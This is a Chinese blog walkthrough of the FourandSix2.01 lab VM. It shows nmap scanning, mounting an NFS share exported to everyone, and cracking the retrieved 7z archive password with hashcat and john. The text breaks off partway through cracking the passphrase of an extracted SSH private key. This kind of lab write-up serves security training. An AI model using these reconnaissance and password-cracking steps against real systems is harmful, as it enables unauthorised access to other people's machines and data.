@@ -1,0 +1,757 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="FourandSix2.01靶机信息收集123456789101112131415┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.111[sudo] password for kali: Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-06 21:52 EDTWar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FourandSix2.01靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/7015100879bb.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="FourandSix2.01靶机信息收集123456789101112131415┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.111[sudo] password for kali: Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-06 21:52 EDTWar">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/1a56c43b35e9c8067bf309b3674856df_MD5.png">
+<meta property="article:published_time" content="2023-06-07T03:06:00.000Z">
+<meta property="article:modified_time" content="2023-06-07T12:38:04.753Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/1a56c43b35e9c8067bf309b3674856df_MD5.png">
+  
+  
+  
+  <title>FourandSix2.01靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="FourandSix2.01靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-07 11:06" pubdate>
+          2023年6月7日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          147 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">FourandSix2.01靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="FourandSix2-01靶机"><a href="#FourandSix2-01靶机" class="headerlink" title="FourandSix2.01靶机"></a>FourandSix2.01靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.111<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 21:52 EDT<br>Warning: 192.168.56.111 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00044s latency).<br>Not shown: 61719 filtered tcp ports (no-response), 3813 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>111/tcp  open  rpcbind<br>2049/tcp open  nfs<br>MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 71.15 seconds<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -p22,111,2049 192.168.56.111<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 21:53 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00030s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)<br>111/tcp  open  rpcbind 2 (RPC <span class="hljs-comment">#100000)</span><br>2049/tcp open  nfs     2-3 (RPC <span class="hljs-comment">#100003)</span><br>MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: OpenBSD 6.X<br>OS CPE: cpe:/o:openbsd:openbsd:6<br>OS details: OpenBSD 6.0 - 6.4<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.25 seconds<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,111,2049 192.168.56.111<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 22:00 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00029s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>111/tcp  open  rpcbind<br>2049/tcp open  nfs<br>MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.50 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="挂载-nfs"><a href="#挂载-nfs" class="headerlink" title="挂载 nfs"></a>挂载 nfs</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ showmount -e 192.168.56.111                  <br>Export list <span class="hljs-keyword">for</span> 192.168.56.111:<br>/home/user/storage (everyone)<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> /tmp/infosec               <br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ mount -t nfs 192.168.56.111:/home/user/storage /tmp/infosec<br>mount.nfs: failed to apply fstab options<br></code></pre></td></tr></table></figure>
+
+<p>奇怪的失败，查了以下，可能是需要 root 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo mount -t nfs 192.168.56.111:/home/user/storage /tmp/infosec<br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cd</span> /tmp/infosec          <br>                                                                                                                    <br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">ls</span><br>backup.7z<br>                                                                                                                    <br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cp</span> backup.7z /home/kali/Downloads/FourAndSix<br></code></pre></td></tr></table></figure>
+
+<h2 id="7z-压缩文件爆破"><a href="#7z-压缩文件爆破" class="headerlink" title="7z 压缩文件爆破"></a>7z 压缩文件爆破</h2><p>其中只有一个 backup.7z 文件，将其复制到本地路径下，然后使用 file 命令查看文件类型，使用 <code>7za l</code> 命令查看压缩包里的文件有哪些</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ <span class="hljs-built_in">ls</span><br>backup.7z<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ file backup.7z <br>backup.7z: 7-zip archive data, version 0.4<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ <span class="hljs-built_in">where</span> 7za                                                                                             <br>/usr/bin/7za<br>/bin/7za<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ 7za l backup.7z <br><br>7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21<br>p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 7 5800H with Radeon Graphics          (A50F00),ASM,AES-NI)<br><br>Scanning the drive <span class="hljs-keyword">for</span> archives:<br>1 file, 62111 bytes (61 KiB)<br><br>Listing archive: backup.7z<br><br>--<br>Path = backup.7z<br>Type = 7z<br>Physical Size = 62111<br>Headers Size = 303<br>Method = LZMA2:16 7zAES<br>Solid = +<br>Blocks = 1<br><br>   Date      Time    Attr         Size   Compressed  Name<br>------------------- ----- ------------ ------------  ------------------------<br>2018-10-28 04:45:33 ....A         9000        61808  hello1.jpeg<br>2018-10-28 04:45:33 ....A         5247               hello2.png<br>2018-10-28 04:45:33 ....A         8903               hello3.jpeg<br>2018-10-28 04:45:33 ....A         8330               hello4.png<br>2018-10-28 04:45:33 ....A        10038               hello5.jpeg<br>2018-10-28 04:45:33 ....A         5931               hello6.png<br>2018-10-28 04:45:33 ....A         6181               hello7.jpeg<br>2018-10-28 04:45:33 ....A         8182               hello8.jpeg<br>2018-10-28 05:50:57 ....A         1856               id_rsa<br>2018-10-28 05:52:57 ....A          398               id_rsa.pub<br>------------------- ----- ------------ ------------  ------------------------<br>2018-10-28 05:52:57              64066        61808  10 files<br><br></code></pre></td></tr></table></figure>
+
+<p>其中包含了一些图片和 ssh 的公私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ 7za x backup.7z<br><br>7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21<br>p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 7 5800H with Radeon Graphics          (A50F00),ASM,AES-NI)<br><br>Scanning the drive <span class="hljs-keyword">for</span> archives:<br>1 file, 62111 bytes (61 KiB)<br><br>Extracting archive: backup.7z<br>--<br>Path = backup.7z<br>Type = 7z<br>Physical Size = 62111<br>Headers Size = 303<br>Method = LZMA2:16 7zAES<br>Solid = +<br>Blocks = 1<br><br>    <br>Enter password (will not be echoed):<br><br></code></pre></td></tr></table></figure>
+
+<p>尝试解压但是需要密码，直接回车报错，那就使用工具爆破吧，原本想使用 <code>rarcrack</code> 但是爆破速度实在太慢，谷歌了一下，打算使用 hashcat 搭配</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ hashcat -m 11600 7z.<span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt<br>hashcat (v6.2.5) starting<br><br>OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>=====================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-AMD Ryzen 7 5800H with Radeon Graphics, 708/1480 MB (256 MB allocatable), 4MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>clBuildProgram(): CL_BUILD_PROGRAM_FAILURE<br><br>error: unknown target CPU <span class="hljs-string">&#x27;generic&#x27;</span><br>Device pthread-AMD Ryzen 7 5800H with Radeon Graphics failed to build the program, <span class="hljs-built_in">log</span>: error: unknown target CPU <span class="hljs-string">&#x27;generic&#x27;</span><br><br>* Device <span class="hljs-comment">#1: Kernel /usr/share/hashcat/OpenCL/shared.cl build failed.</span><br><br>Started: Tue Jun  6 22:22:43 2023<br>Stopped: Tue Jun  6 22:22:44 2023<br><br></code></pre></td></tr></table></figure>
+
+<p>hashcat 报错……搜了一下这个问题解决起来比较麻烦，应该是 VMware 的问题，尝试了几种方法都无效，那就在本机下载个 hashcat 来试试吧。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat.exe -m 11600 7z.<span class="hljs-built_in">hash</span> rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<p>爆破是有结果了……但是有个更抽象的问题，爆破出来的密码好像是错的，无法解压 7z 文件，换个工具 john 试试吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ john --format=7z -w /usr/share/wordlists/rockyou.txt 7z.<span class="hljs-built_in">hash</span> <br>Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])<br>Cost 1 (iteration count) is 524288 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (padding size) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 3 (compression <span class="hljs-built_in">type</span>) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 4 (data length) is 9488 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Proceeding with wordlist:/usr/share/john/password.lst<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>chocolate        (?)     <br>1g 0:00:00:05 DONE (2023-06-06 22:40) 0.1953g/s 65.62p/s 65.62c/s 65.62C/s benjamin..cruise<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>
+
+<p>成功得到密码 <code>chocolate</code>，解压缩成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ <span class="hljs-built_in">ls</span><br>backup.7z    hello2.png   hello4.png   hello6.png   hello8.jpeg  id_rsa.pub<br>hello1.jpeg  hello3.jpeg  hello5.jpeg  hello7.jpeg  id_rsa<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ file *.jpeg<br>hello1.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 258x195, components 3<br>hello3.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 227x222, components 3<br>hello5.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 226x223, components 3<br>hello7.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 282x179, components 3<br>hello8.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 204x248, components 3<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ file *.png <br>hello2.png: PNG image data, 257 x 196, 8-bit colormap, non-interlaced<br>hello4.png: PNG image data, 206 x 244, 8-bit colormap, non-interlaced<br>hello6.png: PNG image data, 177 x 232, 8-bit colormap, non-interlaced<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ <span class="hljs-built_in">cat</span> id_rsa.pub <br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn user@fourandsix2<br></code></pre></td></tr></table></figure>
+
+<h2 id="私钥密码爆破"><a href="#私钥密码爆破" class="headerlink" title="私钥密码爆破"></a>私钥密码爆破</h2><p>我们首先应该使用 <code>file</code>，<code>xdg-open</code>，<code>binwalk</code>（捆绑），<code>exiftool</code>（注释内容）来查看图片。</p>
+<p>图片文件应该没什么问题，重点放在公私钥上，使用私钥登录试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ ssh -i id_rsa user@192.168.56.111<br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.111 (192.168.56.111)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:bYL1jAzqEuvAJUa0fNrhsGN1637L223ZIavvbfsCL0g.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.111<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Enter passphrase for key &#x27;</span>id_rsa<span class="hljs-string">&#x27;:</span><br></code></pre></td></tr></table></figure>
+
+<p>私钥被加密了，那我们再来一次爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ ssh2john id_rsa &gt;rsa_hash<br></code></pre></td></tr></table></figure>
+
+<p>好像不太好直接指定 john 的 format 参数，那就交给 john 自己来测试吧。再次遇到小问题，session 直接结束了</p>
